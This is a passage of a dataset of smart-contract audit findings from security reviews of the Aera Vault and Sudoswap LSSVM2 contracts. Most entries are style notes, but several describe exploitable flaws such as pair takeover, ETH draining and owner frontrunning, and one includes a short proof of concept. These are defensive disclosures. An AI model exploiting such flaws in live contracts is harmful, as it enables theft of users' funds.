        "body": "The functions deposit() and withdraw() call function getNormalizedWeights() while the function updateWeightsGradually() and cancelWeightUpdates() call pool.getNormalizedWeights(). Although this is functionally the same, it is not consistent. 29 function deposit(uint256[] calldata amounts) ... { ... uint256[] memory weights = getNormalizedWeights(); ... emit Deposit(amounts, getNormalizedWeights()); } function withdraw(uint256[] calldata amounts) ... { ... uint256[] memory weights = getNormalizedWeights(); ... emit Withdraw(amounts, allowances, getNormalizedWeights()); } function updateWeightsGradually(...) ... { ... uint256[] memory weights = pool.getNormalizedWeights(); ... } function cancelWeightUpdates() ... { ... uint256[] memory weights = pool.getNormalizedWeights(); ... } function getNormalizedWeights() ... { return pool.getNormalizedWeights(); }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add function disableTrading() to IManagerAPI.sol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The disableTrading() function can also be called by managers because of the onlyOwnerOrMan- agermodifier. However in AeraVaultV1.sol it is located in the PROTOCOL API section. It is also not present in IManagerAPI.sol. contract AeraVaultV1 is IAeraVaultV1, Ownable, ReentrancyGuard { /// PROTOCOL API /// function disableTrading() ... onlyOwnerOrManager ... { ... } /// MANAGER API /// } interface IManagerAPI { function updateWeightsGradually(...) external; function cancelWeightUpdates() external; function setSwapFee(uint256 newSwapFee) external; function claimManagerFees() external; } // disableTrading() isn't present 30",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Doublecheck layout functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Different ways are used to layout functions. Especially the part between ( ... ) and between ) ... { is sometimes done on one line and sometimes split in multiple lines. Also { is sometimes at the end of a line and sometimes at the beginning. Although the layout is not disturbing it might be useful to doublecheck it. Here are a few examples of different layouts: function updateWeights(uint256[] memory weights, uint256 weightSum) internal ... { } function depositToken(IERC20 token, uint256 amount) internal { ... } function updatePoolBalance( uint256[] memory amounts, IBVault.PoolBalanceOpKind kind ) internal { ... } function updateWeights(uint256[] memory weights, uint256 weightSum) internal ... { } function updateWeightsGradually( uint256[] calldata targetWeights, uint256 startTime, uint256 endTime ) external override onlyManager whenInitialized whenNotFinalizing { ... } function getWeightChangeRatio(uint256 weight, uint256 targetWeight) internal pure returns (uint256) { } ...",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use Math library functions in a consistent way",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "In the AeraVaultV1 contract, the OZs Math library functions are attached to the type uint256. The min function is used as a member function whereas the max function is used as a library function.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Separation of concerns Owner and Manager",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The Owner and Manager roles are separated on purpose. Role separation usually helps to improve quality. However this separation can be broken if the Owner calls setManager(). This way the Owner can set the Manager to one of his own addresses, do Manager functions (for example setSwapFee()) and perhaps set it back to the Manager. Note: as everything happens on chain these actions can be tracked. function setManager(address newManager) external override onlyOwner { if (newManager == address(0)) { revert Aera__ManagerIsZeroAddress(); } if (initialized && noticeTimeoutAt == 0) { calculateAndDistributeManagerFees(); } emit ManagerChanged(manager, newManager); manager = newManager; }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add modifier whenInitialized to function finalize()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The function finalize() does not have the modifier whenInitialized while most other functions have this modifier. This does not create any real issues because the function contains the check noticeTimeoutAt == 0 which can only be skipped after initiateFinalization(), and this function does have the whenInitialized modifier. function finalize() external override nonReentrant onlyOwner { // no modifier whenInitialized if (noticeTimeoutAt == 0) { // can only be set via initiateFinalization() revert Aera__FinalizationNotInitialized(); } ... }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document the use of mustAllowlistLPs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "In the Mannon Vault it is important that no other accounts can use joinPool() on the balancer pool. If other accounts are able to call joinPool(), they would get Balancer Pool Tokens (BPT) which could rise in value once more funds are added to the pool. Luckily this is prevented by the mustAllowlistLPs parameter in NewPoolParams. Readers could easily overlook this parameter. pool = IBManagedPool( IBManagedPoolFactory(factory).create( IBManagedPoolFactory.NewPoolParams({ vault: IBVault(address(0)), name: name, symbol: symbol, tokens: tokens, normalizedWeights: weights, assetManagers: managers, swapFeePercentage: swapFeePercentage, pauseWindowDuration: 0, bufferPeriodDuration: 0, owner: address(this), swapEnabledOnStart: false, mustAllowlistLPs: true, managementSwapFeePercentage: 0 // prevent other account to use joinPool }) ) );",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "finalize can be called multiple times",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The finalize function can be called multiple time, leading to the possibility to waste gas for no reason and emitting again a conceptually wrong Finalized event. Currently, theres no check that will prevent to call the function multiple time and there is no explicit flag to allow external sources (web app, external contract) to know whether the AeraVault has been finalized or not. Scenario: the AeraVault has already been finalized but the owner (that could be a contract and not a single EOA) is not aware of it. He calls finalize again and wastes gas because of the external calls in a loop done in returnFunds and emit an additional event Finalized(owner(), [0, 0, ..., 0]) with an array of zeros in the amounts event parameter.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider updating finalize to have a more \"clean\" final state for the AeraVault/Balancer pool",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "This is just a suggestion and not an issue per se. The finalize function should ensure that the pool is in a finalized state for both a better UX and DX. Currently, the finalize function is only withdrawing all the funds from the pool after a noticePeriod but is not ensuring that the swap have been disabled and that all the rewards, entitled to the Vault (owned by the Treasury), have been claimed.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "enableTradingWithWeights is not emitting an event for pools weight change",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "enableTradingWithWeights is both changing the pools weight and enabling the swap feature, but its only emitting the swap related event (done by calling setSwapEnabled). Both of those operations should be correctly tracked via events to be monitored by external tools.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document Balancer checks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Balancer has a large number of internal checks. Weve discussed the use of additional checks in the Aera Vault functions. The advantage of this is that it could result in more user friendly error messages. Additionally it protects against potential future change in the Balancer code. contract AeraVaultV1 is IAeraVaultV1, Ownable, ReentrancyGuard { function enableTradingWithWeights(uint256[] calldata weights) ... { { ... // doesn't check weights.length pool.updateWeightsGradually(timestamp, timestamp, weights); ... } } Balancer code: function updateWeightsGradually( ..., uint256[] memory endWeights) ... { (IERC20[] memory tokens, , ) = getVault().getPoolTokens(getPoolId()); ... InputHelpers.ensureInputLengthMatch(tokens.length, endWeights.length); // length check is here ... }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rename FinalizationInitialized to FinalizationInitiated for code consistency",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The function at L517 was renamed from initializeFinalization to initiateFinalization to avoid confusion with the Aera vault initialization. For code consistency, the corresponding event and error names should be changed.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider enforcing an explicit check on token order to avoid human error",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The Balancer protocol require (and enforce during the pool creation) that the pools token must be ordered by the token address. The following functions accept an uint256[] of amounts or weights without knowing if the order inside that array follow the same order of the tokens inside the Balancer pool.  initialDeposit  deposit  withdraw  enableTradingWithWeights  updateWeightsGradually While its impossible to totally prevent the human error (they could specify the correct token order but wrongly swap the input order of the amount/weight) we could force the user to be more aware of the specific order in which the amounts/weights must be specified. A possible solution applied to the initialDeposit as an example could be: 37 function initialDeposit(IERC20[] calldata tokensSorted, uint256[] calldata amounts) external override onlyOwner { // ... other code IERC20[] memory tokens = getTokens(); // check that also the tokensSorted length match the lenght of other arrays if (tokens.length != amounts.length || tokens.length != tokensSorted.length) { revert Aera__AmountLengthIsNotSame( tokens.length, amounts.length ); } // ... other code for (uint256 i = 0; i < tokens.length; i++) { // check that the token position associated to the amount has the same position of the one in ,! the balancer pool if( address(tokens[i]) != address(tokensSorted[i]) ) { revert Aera__TokenOrderIsNotSame( address(tokens[i]), address(tokensSorted[i]), i ); } depositToken(tokens[i], amounts[i]); } // ... other code } Another possible implementation would be to introduce a custom struct struct TokenAmount { IERC20 token; uint256 value; } Update the function signature function initialDeposit(TokenAmount[] calldata tokenWithAmount) and up- date the example code following the new parameter model. Its important to note that while this solution will not completely prevent the human error, it will increase the gas consumption of each function.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Swap is not enabled after initialDeposit execution",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "In the current deployment flow of the AeraVault the Balancer pool is created (by the constructor) with swapEnabledOnStart set as false. When the pool receives their initial funds via initialDeposit the pool has still the swap functionality disabled. It is not explicitly clear in the specification document and in the code when the swap functionality should be enabled. If the protocol wants to enable the swap as soon as the funds are deposited in the pool, they should call, after bVault.joinPool(...), setSwapEnabled(true) or enableTradingWithWeights(uint256[] calldata weights) in case the external spot price is not aligned (both functions will also trigger a SetSwapEnabled event)",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove commented code and replace input values with Balancer enum",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Inside initialDeposit function, there is some commented code (used as example) that should be removed for clarity and future confusion. The initUserData should not use direct input values (0 in this case) but use the correct Balancers enum value to avoid any possible confusion. Following the Balancer documentation  Encoding userData  JoinKind The correct way to declare initUserData is using the WeightedPoolUserData.JoinKind.INIT enum value.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "The Created event is not including all the information used to deploy the Balancer pool and are missing indexed properties",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The current Created event is defined as 39 event Created( address indexed factory, IERC20[] tokens, uint256[] weights, address manager, address validator, uint32 noticePeriod, string description ); And is missing some of the information that are used to deploy the pool. To allow external tools to better monitor the deployment of the pools, it should be better to include all the information that have been used to deploy the pool on Balancer. The following information is currently missing from the event definition:  name  symbol  managementFee  swapFeePercentage The event could also define both manager and validator as indexed event parameters to allow external tools to filter those events by those values.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rename temp variable managers to assetManagers to avoid confusions and any potential future mistakes",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The managers declared in the linked code (see context) are in reality Asset Manager that have a totally different role compared to the AeraVault Manager role. The AssetManager is able to control the pools balance, withdrawing from it or depositing into it. To avoid confusion and any potential future mistakes, it should be better to rename the temporary variable managers to a more appropriate name like assetManagers. - address[] memory managers = new address[](tokens.length); + address[] memory assetManagers = new address[](tokens.length); for (uint256 i = 0; i < tokens.length; i++) { - + } managers[i] = address(this); assetManagers[i] = address(this); pool = IBManagedPool( IBManagedPoolFactory(factory).create( - + IBManagedPoolFactory.NewPoolParams({ vault: IBVault(address(0)), name: name, symbol: symbol, tokens: tokens, normalizedWeights: weights, assetManagers: managers, assetManagers: assetManagers, swapFeePercentage: swapFeePercentage, pauseWindowDuration: 0, bufferPeriodDuration: 0, owner: address(this), swapEnabledOnStart: false, mustAllowlistLPs: true, managementSwapFeePercentage: 0 }) ) ); 41",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Move description declaration inside the storage slot code block",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "In the current code, the description state variable is in the block of /// STORAGE /// where all the immutable variable are re-grouped. As the dev comment say, string cannot be immutable bytecode but only set in constructor so it would be better to move it inside the /// STORAGE SLOT START /// block of variables that regroup all the non-constant and non-immutable state variables.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unused imports from code",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The current implementation of the AeraVaultV1 contract is importing OpenZeppelin IERC165 inter- face, but that interface is never used or references in the code.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "shortfall is repeated twice in IWithdrawalValidator natspec comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The word shortfall is repeated twice in the natspec comment.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Provide definition of weights & managementFee_ in the NatSpec comment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The NatSpec Format is special form of comments to provide rich documentation for functions, return variables and more. We observed an occurrence where the NatSpec comments are missing for two of the user inputs (weights & managementFee_).",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Partial fills for buy orders in ERC1155 swaps will fail when pair has insufficient balance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Partial fills are currently supported for buy orders in VeryFastRouter.swap(). When _findMaxFil- lableAmtForBuy() determines numItemsToFill, it is not guaranteed that the underlying pair has so many items left to fill. While ERC721 swap handles the scenario where pair balance is less than numItemsToFill in the logic of _findAvailableIds() (maxIdsNeeded vs numIdsFound), ERC1155 swap is missing a similar check and reduction of item numbers when required. Partial fills for buy orders in ERC1155 swaps will fail when the pair has a balance less than numItemsToFill as determined by _findMaxFillableAmtForBuy(). Partial filling, a key feature of VeryFastRouter, will then not work as expected and would lead to an early revert which defeats the purpose of swap().",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Function token() of cloneERC1155ERC20Pair() reads from wrong location",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function token() loads the token data from position 81. However on ERC1155 pairs it should load it from position 93. Currently, it doesn't retrieve the right values and the code won't function correctly. LSSVMPair.sol: LSSVMPair.sol: 20))) ,! LSSVMPair.sol: 40))) ,! LSSVMPair.sol: 60))) _factory _bondingCurve := shr(0x60, calldataload(sub(calldatasize(), paramsLength))) := shr(0x60, calldataload(add(sub(calldatasize(), paramsLength), _nft := shr(0x60, calldataload(add(sub(calldatasize(), paramsLength), _poolType := shr(0xf8, calldataload(add(sub(calldatasize(), paramsLength), ,! LSSVMPairERC1155.sol: id LSSVMPairERC721.sol: _propertyChecker := shr(0x60, calldataload(add(sub(calldatasize(), paramsLength), := calldataload(add(sub(calldatasize(), paramsLength), 61)) 61))) ,! LSSVMPairERC20.sol: ,! 81))) _token := shr(0x60, calldataload(add(sub(calldatasize(), paramsLength), function cloneERC1155ERC20Pair(... ) ... { assembly { ... mstore(add(ptr, 0x3e), shl(0x60, factory)) - 20 bytes mstore(add(ptr, 0x52), shl(0x60, bondingCurve)) // position 20 - 20 bytes // position 40 - 20 bytes mstore(add(ptr, 0x66), shl(0x60, nft)) // position 60 - 1 bytes mstore8(add(ptr, 0x7a), poolType) // position 61 - 32 bytes mstore(add(ptr, 0x7b), nftId) mstore(add(ptr, 0x9b), shl(0x60, token)) // position 93 - 20 bytes ... // position 0 } } 6",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Switched order of update leads to incorrect partial fill calculations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "In the binary search, the order of updation of start and numItemsToFill is switched with start being updated before numItemsToFill which itself uses the value of start: start = (start + end)/2 + 1; numItemsToFill = (start + end)/2; This leads to incorrect partial fill calculations when binary search recurses on the right half.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Swap functions with sell orders in LSSVMRouter will fail for property-check enforced pairs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Swap functions with sell orders in LSSVMRouter will revert for property-check enforced pairs. While VeryFastRouter swap function supports sell orders to specify property check parameters for pairs enforcing them, none of the swap functions in LSSVMRouter support the same.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: High Risk"
        ]
    },
    {
        "title": "pairTransferERC20From() only supports ERC721 NFTs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Function pairTransferERC20From() which is is present in both LSSVMRouter and VeryFastRouter, only checks for ERC721_ERC20. This means ERC1155 NFTs are not supported by the routers. The following code is present in both LSSVMRouter and VeryFastRouter. function pairTransferERC20From(...) ... { require(factory.isPair(msg.sender, variant), \"Not pair\"); ... require(variant == ILSSVMPairFactoryLike.PairVariant.ERC721_ERC20, \"Not ERC20 pair\"); ... } 7",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Insufficient application of trading fee leads to 50% loss for LPs in swapTokenForAnyNFTs()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The protocol applies a trading fee of 2*tradeFee on NFT buys from pairs (to compensate for 0 fees on NFT sells as noted in the comment: \"// We pull twice the trade fee on buys but don't take trade fee on sells if assetRecipient is set\"). this While ERC1155.swapTokenForSpecificNFTs(), trading fee of only tradeFee (instead of 2*tradeFee). enforced in is LSSVMPairERC721.swapTokenForSpecificNFTs() LSSVMPairERC1155.swapTokenForAnyNFTs() and LSSVMPair- a enforces Affected LPs of pairs targeted by LSSVMPairERC1155. swapTokenForAnyNFTs() will unexpectedly lose 50% of the trade fees.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Royalty not always being taken into account leads to incorrect protocol accounting",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function getSellNFTQuoteWithRoyalties() is similar to getSellNFTQuote(), except that it also takes the royalties into account. When the function robustSwapNFTsForToken() of the LSSVMRouter is called, it first calls getSellNFTQuote() and checks that a sufficient amount of tokens will be received. Then it calls swapNFTs- ForToken() with 0 as minExpectedTokenOutput; so it will accept any amount of tokens. The swapNFTsForToken() does subtract the Royalties which will result in a lower amount of tokens received and might not be enough to satisfy the requirements of the seller. The same happens in  robustSwapETHForSpecificNFTsAndNFTsToToken and  robustSwapERC20ForSpecificNFTsAndNFTsToToken. Note: Function getSellNFTQuote() of StandardSettings.sol also uses getSellNFTQuote(). However there it is compared to the results of getBuyInfo(); so this is ok as both don't take the royalties into account. Note: getNFTQuoteForSellOrderWithPartialFill() also has to take royalties into account. 8 function getSellNFTQuote(uint256 numNFTs) ... { ( (...., outputAmount, ) = bondingCurve().getSellInfo(...); } function getSellNFTQuoteWithRoyalties(uint256 assetId, uint256 numNFTs) ... { (..., outputAmount, ... ) = bondingCurve().getSellInfo(...); (,, uint256 royaltyTotal) = _calculateRoyaltiesView(assetId, outputAmount); ... outputAmount -= royaltyTotal; } function robustSwapNFTsForToken(...) ... { ... (error,,, pairOutput,) = swapList[i].swapInfo.pair.getSellNFTQuote(swapList[i].swapInfo.nftIds.length); ... if (pairOutput >= swapList[i].minOutput) { ....swapNFTsForToken(..., 0, ...); } ... ,! } function swapNFTsForToken(...) ... { ... (protocolFee, outputAmount) = _calculateSellInfoAndUpdatePoolParams(numNFTs[0], _bondingCurve, _factory); (... royaltyTotal) = _calculateRoyalties(nftId(), outputAmount); ... outputAmount -= royaltyTotal; ... _sendTokenOutput(tokenRecipient, outputAmount); ,! }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Error return codes of getBuyInfo() and getSellInfo() are sometimes ignored",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The functions getBuyInfo() and getSellInfo() return an error code when they detect an error. The rest of the returned parameters then have an unusable/invalid value (0). However, some callers of these functions ignore the error code and continue processing with the other unusable/invalid values. The functions getBuyNFTQuote(), getSellNFTQuote() and getSellNFTQuoteWithRoyalties() pass through the error code, so their callers have to check the error codes too. 9 function getBuyInfo(...) ... returns (CurveErrorCodes.Error error, ... ) { } function getSellInfo(...) ... returns (CurveErrorCodes.Error error, ... ) { } function getBuyNFTQuote(...) ... returns (CurveErrorCodes.Error error, ... ) { (error, ... ) = bondingCurve().getBuyInfo(...); } function getSellNFTQuote(...) ... returns (CurveErrorCodes.Error error, ... ) { (error, ... ) = bondingCurve().getSellInfo(...); } function getSellNFTQuoteWithRoyalties(...) ... returns (CurveErrorCodes.Error error, ... ) { (error, ... ) = bondingCurve().getSellInfo(...); }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: High Risk"
        ]
    },
    {
        "title": "changeSpotPriceAndDelta() only uses ERC721 version of balanceOf()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function changeSpotPriceAndDelta() uses balanceOf() with one parameter. This is the ERC721 variant. In order to support ERC1155, a second parameter of the NFT id has to be supplied. function changeSpotPriceAndDelta(address pairAddress, ...) public { ... if ((newPriceToBuyFromPair < priceToBuyFromPair) && pair.nft().balanceOf(pairAddress) >= 1) { ... } }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: High Risk"
        ]
    },
    {
        "title": "_pullTokenInputAndPayProtocolFee() doesn't check that tokens are received",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function _pullTokenInputAndPayProtocolFee() doesn't verify that it actually received the to- kens after doing safeTransferFrom(). This can be an issue with fee on transfer tokens. This is also an issue with (accidentally) non-existing tokens, as safeTransferFrom() won't revert on that, see POC below. Note: also see issue \"Malicious router mitigation may break for deflationary tokens\". function _pullTokenInputAndPayProtocolFee(...) ... { ... _token.safeTransferFrom(msg.sender, _assetRecipient, saleAmount); ... } Proof Of Concept: // SPDX-License-Identifier: MIT pragma solidity ^0.8.18; import \"hardhat/console.sol\"; import {ERC20} from \"https://raw.githubusercontent.com/transmissions11/solmate/main/src/tokens/ERC20.sol\"; ,! import {SafeTransferLib} from \"https://raw.githubusercontent.com/transmissions11/solmate/main/src/utils/SafeTransferLib.sol\"; ,! contract test { using SafeTransferLib for ERC20; function t() public { ERC20 _token = ERC20(address(1)); _token.safeTransferFrom(msg.sender, address(0), 100); console.log(\"after safeTransferFrom\"); } }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "A malicious settings contract can call onOwnershipTransferred() to take over pair",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function onOwnershipTransferred() can be called from a pair via call(). This can be done It can either before transferOwnership() or after it. If it is called before then it updates the AssetRecipient. only be called after the transferOwnership() when an alternative (malicious) settings contract is used. In that situation pairInfos[] is overwritten and the original owner is lost; so effectively the pair can be taken over. Note: if the settings contract is malicious then there are different ways to take over the pair, but using this approach the vulnerabilities can be hidden. 11 function onOwnershipTransferred(address prevOwner, bytes memory) public payable { ILSSVMPair pair = ILSSVMPair(msg.sender); require(pair.poolType() == ILSSVMPair.PoolType.TRADE, \"Only TRADE pairs\"); ... }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "One can attempt to steal a pair's ETH",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Anyone can pass the enrolled pair's address instead of a splitter address in bulkWithdrawFees() to effectively call the pair's withdrawAllETH() instead of a splitter's withdrawAllETH(). Anyone can attempt to steal/drain all the ETH from a pair. However, the pair's withdrawAllETH() sends ETH to the owner, which in this case is the settings contract. The settings contract is unable to receive ETH as currently implemented. So the attempt reverts.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "swap() could mix tokens with ETH",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function swap() adds the output of swapNFTsForToken() to the ethAmount. Although this only happens when order.isETHSell == true , this value could be set to the wrong value accidentally or on purpose. Then the number of received ERC20 tokens could be added to the ethAmount, which is clearly unwanted. The resulting ethAmount is returned to the user. Luckily the router (normally) doesn't have extra ETH so the impact should be limited. function swap(Order calldata swapOrder) external payable { uint256 ethAmount = msg.value; if (order.isETHSell && swapOrder.recycleETH) { ... outputAmount = pair.swapNFTsForToken(...); ... ethAmount += outputAmount; ... } ... // Send excess ETH back to token recipient if (ethAmount > 0) { payable(swapOrder.tokenRecipient).safeTransferETH(ethAmount); } }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Using a single tokenRecipient in VeryFastRouter could result in locked NFTs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "VeryFastRouter uses a single tokenRecipient address for both ETH/tokens and NFTs, unlike LSSVMRouter which uses a separate tokenRecipient and nftRecipient. It is error-prone to have a single tokenRecipient receive both tokens and NFTs, especially when the other/existing LSSVMRouter has a separate nftRecipient. VeryFastRouter.swap() sends both sell order tokens to tokenRe- cipient and buy order NFTs to tokenRecipient. Front-ends integrating with both routers (or migrating to the new one) may surprise users by sending both tokens+NFTs to the same address when interacting with this router. This coupled with the use of nft.transferFrom() may result in NFTs being sent to contracts that are not ERC-721 receivers and get them locked forever.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Owner can mislead users by abusing changeSpotPrice() and changeDelta()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "A malicious owner could set up a pair which promises to buy NFTs for high prices. As soon as someone tries to trade, the owner could frontrun the transaction by setting the spotprice to 0 and gets the NFT for free. Both changeSpotPrice() and changeDelta() can be used to immediately change trade parameters where the aftereffects depends on the curve being used. Note: The swapNFTsForToken() parameter minExpectedTokenOutput and swapTokenForSpecificNFTs() param- eter maxExpectedTokenInput protect users against sudden price changes. But users might not always set them in an optimal way. A design goal of the project team is that the pool owner can quickly respond to changing market conditions, to prevent unnecessary losses. function changeSpotPrice(uint128 newSpotPrice) external onlyOwner { ... } function changeDelta(uint128 newDelta) external onlyOwner { ... }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Pair may receive less ETH trade fees than expected under certain conditions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Depending on the values of protocol fee and royalties, if _feeRecipient == _assetRecipient, the pair will receive less trade fees than expected. Assume a scenario where inputAmount == 100, protocolFee == 30, royaltyTotal == 60 and tradeFeeAmount == 20. This will result in a revert because of underflow in saleAmount -= tradeFeeAmount; when _feeRecipient != _assetRecipient. However, when _feeRecipient == _assetRecipient, the pair will receive trade fees of 100 - 30 - 60 = 10, whereas it normally would have expected 20.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Swapping tokens/ETH for NFTs may exhibit unexpected behavior for certain values of input amount, trade fees and royalties",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
